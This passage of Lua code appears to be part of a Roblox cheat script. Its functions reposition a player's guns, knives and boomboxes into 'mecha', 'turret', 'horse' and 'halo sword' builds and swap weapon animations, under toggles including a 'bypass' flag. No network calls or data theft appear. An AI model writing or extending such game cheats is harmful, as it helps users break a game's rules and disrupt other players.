					for i, Knives in pairs(GetTools("Knife")) do
						split = not split
						if split and ONknifeauravisualizer then
							Knives.Grip = CFrame.Angles(0, 0, math.rad(0 - value - 180)) * CF(-3.7, offset, 0) * CFrame.Angles(math.rad((i * (360 / #GetTools("Knife")) + value)), math.rad(90),0) * CF(1.5, 0, 2.5 + soundx.PlaybackLoudness/1000 * sens)
							Knives.Parent = plr.Character
						elseif not split and ONknifeauravisualizer then
							Knives.Grip = CFrame.Angles(math.rad(180), 0, math.rad(0 + value)) * CF(-3.7, offset, 0) * CFrame.Angles(math.rad((i * (360 / #GetTools("Knife")) + value)), math.rad(90),0) * CF(1.5, 0, 2.5 - soundx.PlaybackLoudness/1000 * sens)
							Knives.Parent = plr.Character
						elseif split then
							Knives.Grip = CFrame.Angles(0, 0, math.rad(0 - value - 180)) * CF(-3.7, offset, 0) * CFrame.Angles(math.rad((i * (360 / #GetTools("Knife")) + value)), math.rad(90),0) * CF(1.5, 0, 2.5 + value2)
							Knives.Parent = plr.Character
						elseif not split then
							Knives.Grip = CFrame.Angles(math.rad(180), 0, math.rad(0 + value)) * CF(-3.7, offset, 0) * CFrame.Angles(math.rad((i * (360 / #GetTools("Knife")) + value)), math.rad(90),0) * CF(1.5, 0, 2.5 - value2)
							Knives.Parent = plr.Character
						end
						Knives.Parent = plr.Character
						ClearAnims("455657967")
					end
					wait()
				end
				ClearTools()
				split = false
				value = 0
				value2 = 0
				last = ""
			end))
		end
	end

	--//Mecha Robot
	function MechaBot()
		ClearTools()
		for i, b in pairs(GetTools("Pipe")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, -2.2, -3.1)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, -2.2, -1.6)
				b.Parent = plr.Character
			elseif i == 3 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, -2.2, -0.75)
				b.Parent = plr.Character
			elseif i == 4 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(-25), math.rad(-45)) * CF(-4, -0.5, -2.5)
				b.Parent = plr.Character
			elseif i == 5 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(205), math.rad(45)) * CF(7, -0.5, -2.5)
				b.Parent = plr.Character
			elseif i == 6 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(205), math.rad(90)) * CF(-5.45, -3.5, -1)
				b.Parent = plr.Character
			elseif i == 7 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(205), math.rad(90)) * CF(8.45, -3.5, -1)
				b.Parent = plr.Character
			end
			for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
				if c.Animation.AnimationId:match("%d+") == "503259904" then
					c:Stop()
				end
			end
		end

		for i, b in pairs(GetTools("BoomBox")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(-1, -0.5, 6)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(4, -0.5, 6)
				b.Parent = plr.Character
			elseif i == 3 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(-1, 0, 3.8)
				b.Parent = plr.Character
			elseif i == 4 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(4, 0, 3.8)
				b.Parent = plr.Character
			elseif i == 5 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(-1.8, 0, 1.6)
				b.Parent = plr.Character
			elseif i == 6 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(4.8, 0, 1.6)
				b.Parent = plr.Character
			elseif i == 7 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(-0.2, 0, 1.6)
				b.Parent = plr.Character
			elseif i == 8 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(3.2, 0, 1.6)
				b.Parent = plr.Character
			elseif i == 9 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(0.7, 0, 1.6)
				b.Parent = plr.Character
			elseif i == 10 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(2.3, 0, 1.6)
				b.Parent = plr.Character
			elseif i == 11 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-1.8, 2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 12 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(4.8, 2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 13 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-0.2, 2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 14 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(3.2, 2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 15 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(0.7, 2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 16 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(2.3, 2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 17 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-1.8, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 18 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(4.8, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 19 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-0.2, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 20 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(3.2, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 21 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(0.7, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 22 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(2.3, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 23 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-0.2, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 24 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(3.2, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 25 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(0.7, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 26 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(2.3, 2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 27 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(-2, -0.8, -3.8)
				b.Parent = plr.Character
			elseif i == 28 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(-2, 0.8, -3.8)
				b.Parent = plr.Character
			elseif i == 29 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(-2, -0.8, -0.6)
				b.Parent = plr.Character
			elseif i == 30 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(-2, 0.8, -0.6)
				b.Parent = plr.Character
			elseif i == 31 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(5, -0.8, -3.8)
				b.Parent = plr.Character
			elseif i == 32 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(5, 0.8, -3.8)
				b.Parent = plr.Character
			elseif i == 33 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(5, -0.8, -0.6)
				b.Parent = plr.Character
			elseif i == 34 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(5, 0.8, -0.6)
				b.Parent = plr.Character
			elseif i == 35 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(3.6, -2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 36 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-0.6, -2.2, -3.8)
				b.Parent = plr.Character
			elseif i == 37 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(3.6, -2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 38 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(90)) * CF(-0.6, -2.2, -0.6)
				b.Parent = plr.Character
			elseif i == 39 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, -2.2, 0.2)
				b.Parent = plr.Character
			elseif i == 40 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, -2.2, -4.6)
				b.Parent = plr.Character
			elseif i == 41 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(-25), math.rad(-90)) * CF(-5.45, -3.5, -1)
				b.Parent = plr.Character
			elseif i == 42 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(25), math.rad(90)) * CF(8.45, -3.5, -1)
				b.Parent = plr.Character
			elseif i == 43 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(-25), math.rad(-45)) * CF(-4, -0.5, -2.5)
				b.Parent = plr.Character
			elseif i == 44 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(25), math.rad(45)) * CF(7, -0.5, -2.5)
				b.Parent = plr.Character
			elseif i == 45 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(-0.6, 0, -4.8)
				b.Parent = plr.Character
			elseif i == 46 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(1, 0, -4.8)
				b.Parent = plr.Character
			elseif i == 47 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(3.6, 0, -4.8)
				b.Parent = plr.Character
			elseif i == 48 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)) * CF(2, 0, -4.8)
				b.Parent = plr.Character
			end
			if b.Handle:FindFirstChild"Mesh" ~= nil and i <= 48 then
				b.Handle.Mesh:Destroy()
			end
			coroutine.resume(coroutine.create(function()
				while plr.Character:FindFirstChild"BoomBox" and ONmecha do
					wait()
				end
				ClearTools()
				plr.Character.Humanoid.HipHeight = 0
				if ONmecha and plr.Character.Humanoid.Health > 0 then
					MechaBot()
				end
			end))
		end

		for i, b in pairs(GetTools("Glock")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CF(8.45, -6, -0.8)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CF(-5.45, -6, -0.8)
				b.Parent = plr.Character
			end
			b.Fires.AnimationId = "rbxassetid://"
			b.Reloading.AnimationId = "rbxassetid://"
			for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
				if c.Animation.AnimationId:match("%d+") == "503285264" then
					c:Stop()
				end
			end
		end
		plr.Character.Humanoid.HipHeight = 4.5
		wait()
	end

	--//Turrets
	function Turrets()
		ClearTools()
		for i, b in pairs(GetTools("Shotty")) do
			b.Parent = plr.Backpack
			b.Fires.AnimationId = "rbxassetid://"
			if turretsvalue == 1 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.08 + turretsvalue2, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 2 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.12 + turretsvalue2, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 3 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.015 + turretsvalue2, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 4 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.185 + turretsvalue2, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 5 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.04 - turretsvalue2, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 6 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.16 - turretsvalue2, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 7 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.055 - turretsvalue2, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 8 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.145 - turretsvalue2, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 9 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.08 + turretsvalue2, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 10 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.12 + turretsvalue2, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 11 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.015 + turretsvalue2, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 12 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.185 + turretsvalue2, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 13 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.04 - turretsvalue2, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 14 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.16 - turretsvalue2, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 15 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.055 - turretsvalue2, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 16 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.145 - turretsvalue2, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 17 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.08 + turretsvalue2 + turretsoffset, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 18 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.12 + turretsvalue2 + turretsoffset, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 19 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.015 + turretsvalue2 + turretsoffset, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 20 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.185 + turretsvalue2 + turretsoffset, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 21 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.04 - turretsvalue2 + turretsoffset, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 22 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.16 - turretsvalue2 + turretsoffset, 0, 0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 23 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.055 - turretsvalue2 + turretsoffset, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 24 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.145 - turretsvalue2 + turretsoffset, 0, -0.19 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 25 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.08 + turretsvalue2 + turretsoffset, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 26 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.12 + turretsvalue2 + turretsoffset, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 27 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.015 + turretsvalue2 + turretsoffset, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 28 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.185 + turretsvalue2 + turretsoffset, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 29 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(0.04 - turretsvalue2 + turretsoffset, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 30 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0)) * CF(-0.16 - turretsvalue2 + turretsoffset, 0, 0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 31 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(-0.055 - turretsvalue2 + turretsoffset, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			elseif turretsvalue == 32 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(180)) * CF(0.145 - turretsvalue2 + turretsoffset, 0, -0.59 - turretsheight)
				b.Parent = plr.Character
			end
			if turretsvalue == 32 then
				turretsvalue = 1
			else
				turretsvalue = turretsvalue + 1
			end
		end
		wait()
		ClearAnims("889390949")
		disabled = false
	end
	
	--//Halo Sword
	function HaloSword()
		ClearTools()
		if #GetTools("Knife") >= 2 then
			for i, b in pairs(GetTools("Knife")) do
				b.Parent = plr.Backpack
				if i == 1 then
					b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(0.01, -0.6, 2.9 + halooffset)
					b.Parent = plr.Character
				elseif i == 2 then
					b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(180)) * CF(-0.02, 0.6, 2.9 + halooffset)
					b.Parent = plr.Character
				end
			end
		end
		for i, b in pairs(GetTools("Shotty")) do
			b.Parent = plr.Backpack
			if value3 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(180)) * CF(0.03, 0.4, 0 + halooffset)
				b.Parent = plr.Character
			else
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)) * CF(-0.045, -0.4, 0 + halooffset)
				b.Parent = plr.Character
			end
			value3 = not value3
		end
		value3 = false
		for i, b in pairs(GetTools("Glock")) do
			b.Parent = plr.Backpack
			if value3 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(180)) * CF(0.03, 1, 0 + halooffset)
				b.Parent = plr.Character
			else
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(-0.045, -1, 0 + halooffset)
				b.Parent = plr.Character
			end
			value3 = not value3
		end
		value3 = false
		disabled = false
	end

	--//Bayonet
	function Bayonet()
		ClearTools()
		for i, b in pairs(GetTools("Knife")) do
			b.Parent = plr.Backpack
			if i == 1 then 
				b.Grip = CFrame.Angles(math.rad(180), math.rad(90), math.rad(0)) * CF(0, -0.2, 2.9)
				b.Parent = plr.Character
			end
		end
		for i, b in pairs(GetTools("Shotty")) do
			b.Parent = plr.Backpack
			if i == 1 then 
				b.Grip = CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)) * CF(-0.055, 0, 0)
				b.Parent = plr.Character
			end
		end
		disabled = false
	end

	--//Horse
	function Horse()
		ClearTools()
		for i, b in pairs(GetTools("Shotty")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(-45), math.rad(0), math.rad(0)) * CF(1.5, 0.9, 1.35)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(45), math.rad(180), math.rad(0)) * CF(1.5, 3.25, -4.1)
				b.Parent = plr.Character
			end
		end
		for i, b in pairs(GetTools("Glock")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(180), math.rad(135), math.rad(90)) * CF(1.43, 0.2, 3.6)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(135), math.rad(90)) * CF(1.57, 0.2, 3.6)
				b.Parent = plr.Character
			elseif i == 3 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(45), math.rad(90)) * CF(2.015, -0.59, 3.33)
				b.Parent = plr.Character
			elseif i == 4 then
				b.Grip = CFrame.Angles(math.rad(-90), math.rad(45), math.rad(90)) * CF(0.99, -0.59, 3.33)
				b.Parent = plr.Character
			end
		end
		for i, b in pairs(GetTools("Spray")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(0.19, 5.05, 0.52)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(2.8, 5.05, 0.52)
				b.Parent = plr.Character
			elseif i == 3 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(2.8, 5.05, -3.52)
				b.Parent = plr.Character
			elseif i == 4 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(0.19, 5.05, -3.52)
				b.Parent = plr.Character
			elseif i == 5 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(0.19, 5.9, 0.52)
				b.Parent = plr.Character
			elseif i == 6 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(2.8, 5.9, 0.52)
				b.Parent = plr.Character
			elseif i == 7 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(2.8, 5.9, -3.52)
				b.Parent = plr.Character
			elseif i == 8 then
				b.Grip = CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CF(0.19, 5.9, -3.52)
				b.Parent = plr.Character
			end
			if b.Handle:FindFirstChild"Mesh" ~= nil and i <= 8 then
				b.Handle.Mesh:Destroy()
			end
		end
		for i, b in pairs(GetTools("BoomBox")) do
			b.Parent = plr.Backpack
			if i == 1 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, 2.6, -1.5)
				b.Parent = plr.Character
			elseif i == 2 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, 2.6, -3.1)
				b.Parent = plr.Character
			elseif i == 3 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, 2.6, 0.1)
				b.Parent = plr.Character
			elseif i == 4 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, 3.6, -1.5)
				b.Parent = plr.Character
			elseif i == 5 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, 3.6, -3.1)
				b.Parent = plr.Character
			elseif i == 6 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(0), math.rad(0)) * CF(1.5, 3.6, 0.1)
				b.Parent = plr.Character
			elseif i == 7 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(45), math.rad(90)) * CF(1.5, 1.5, 1.4)
				b.Parent = plr.Character
			elseif i == 8 then
				b.Grip = CFrame.Angles(math.rad(90), math.rad(-45), math.rad(90)) * CF(1.5, 0.372, 3.66)
				b.Parent = plr.Character
			end
			if b.Handle:FindFirstChild"Mesh" ~= nil and i <= 8 then
				b.Handle.Mesh:Destroy()
			end
		end
		ClearAnims("503285264")
		ClearAnims("889390949")
		local Anim4 = Instance.new"Animation"
		Anim4.AnimationId = "rbxassetid://179224234"
		local track4 = plr.Character.Humanoid:LoadAnimation(Anim4):Play()
		plr.Character.Humanoid.HipHeight = 3.2
		coroutine.resume(coroutine.create(function()
			while plr.Character:FindFirstChild"BoomBox" and ONhorse do
				wait()
			end
			ClearTools()
			ClearAnims("179224234")
			plr.Character.Humanoid.HipHeight = 0
			plr.Character.Humanoid.WalkSpeed = 16
			if ONhorse and plr.Character.Humanoid.Health > 0 then
				Horse()
			end
		end))
	end

	--//BFG
	function Bfg()
		for i, c in pairs(plr.Backpack:GetChildren()) do
			if CheckGuns(c) then
				c.Parent = plr.Character
			end
		end
		ClearAnims("503285264")
		wait()
		if ONgunanims and not ONlegit then
			PlayAnim(889968874)
		end
		disabled = false
	end

	--//Dual BFG
	function DualBfg()
		wait()
		for i, b in pairs(GetTools("Glock")) do
			b.Parent = plr.Backpack
			if dualbfgvalue == 2 then
				b.Grip = CFrame.Angles(0, math.rad(90), 0) * CF(3, -0.100000001, 0.400000006)
			end
			b.Fires.AnimationId = "rbxassetid://939533469"
			b.Reloading.AnimationId = "rbxassetid://939533469"
			b.Parent = plr.Character
			if dualbfgvalue == 2 then
				dualbfgvalue = 1
			else
				dualbfgvalue = dualbfgvalue + 1
			end
		end
		ClearAnims("503285264")
		wait()
		PlayAnim(939533469)
		disabled = false
	end

	--//Gun Animations Function
	function GunAnimations(c)
		local temp = disabled
		if game.PlaceId == 455366377 and c.Name == "Glock" and not c.Handle.CanCollide then
			for i, d in pairs(c:GetDescendants()) do
				if d:IsA"BasePart" then
					d.CanCollide = true
				end
			end
		end
		if CheckGuns(c) then
			if shotscon then shotscon:Disconnect() end
			shotscon = c.Ammo.Changed:Connect(function()
				if CheckGuns(plr.Character:FindFirstChildOfClass"Tool") then
					Shots.Text = plr.Character:FindFirstChildOfClass"Tool".Ammo.Value.. " Shots"
				end
			end)
			if ONgunanims and not ONlegit and not ONsuicidegun and not ONdualbfg and not ONmecha and not ONhorse and not ONturrets then
				ClearAnims("503285264")
				wait()
				PlayAnim(889968874)
				if game.PlaceId == 455366377 then
					for i = 1, 10 do
						ClearAnims("503285264")
						wait(0.05)
					end
				end
			--[[
			ClearAnims("503285264")
			wait()
			PlayAnim(889968874)
			wait()
			ClearAnims("503285264")
			]]
			elseif ONsuicidegun and c.Name == "Glock" then
				c.Parent = plr.Backpack
				c.Grip = CFrame.Angles(math.rad(65),math.rad(0),0.2) * CF(0.1, -0.1, -0.1)
				c.Fires.AnimationId = "rbxassetid://889968874"
				c.Parent = plr.Character
				ClearAnims("503285264")
				wait()
				PlayAnim(889968874)
				if game.PlaceId == 455366377 then
					for i = 1, 10 do
						ClearAnims("503285264")
						wait(0.05)
					end
				end
			end
		end
		if temp then temp = false return end
		--//BFGs
		if ONbypass then
			if ONbfg or ONdualbfg or ONturrets or ONhalo or ONclaws or ONbayonet then
				if CheckGuns(c) then
					if ONdualbfg and c.Name == "Glock" and #GetTools("Glock") >= 2 then
						disabled = true
						DualBfg()
					elseif ONbfg then
						disabled = true
						Bfg()
					elseif ONturrets and c.Name == "Shotty" and #GetTools("Shotty") >= 32 then
						disabled = true
						Turrets()
					elseif ONhalo and (c.Name == "Shotty" or c.Name == "Glock") and #GetTools("Shotty") >= 2 and #GetTools("Glock") >= 2 then
						disabled = true
						HaloSword()
					elseif ONbayonet and c.Name == "Shotty" then
						disabled = true
						Bayonet()
					end
				elseif c.Name == "Knife" and ONclaws and #GetTools("Knife") >= 3 then
					local offset = -0.28
					wait()
					c.Parent = plr.Backpack
					for i, d in pairs(plr.Backpack:GetChildren()) do
						if d:IsA"Tool" and d.Name == "Knife" then
							d.Grip = CFrame.Angles(math.rad(90), math.rad(90), 0) * CF(-0.5, offset, 0.21)
							disabled = true
							d.Parent = plr.Character
							disabled = false
							if offset == 0.28 then
								break
							else
								offset = offset + 0.28
							end
						end
					end
					offset = 0
				end
			end
		end
	end

	--//Backpack Stuff Function
	function BackpackStuff(c)
		if not disabled then
			for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
				if c.Animation.AnimationId == "rbxassetid://889968874" or c.Animation.AnimationId == "rbxassetid://939533469" then
					c:Stop()
				end
			end
		end

		if c:IsA"Tool" then
			if CheckGuns(c) then
				if shotscon then shotscon:Disconnect() end
			end
			if c.Name == "Glock" then
				c.Grip = CF(0.400000006, -0.100000001, 0, 0.00791937113, 0, 0.999968588, 0, 1, 0, -0.999968588, 0, 0.00791937113)
				c:WaitForChild("Fires", 100).AnimationId = "rbxassetid://503287783"
			elseif c.Name == "Shotty" then
				c.Grip = CF(0.5, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				c:WaitForChild("Fires", 100).AnimationId = "rbxassetid://889391270"
			elseif c.Name == "Knife" then
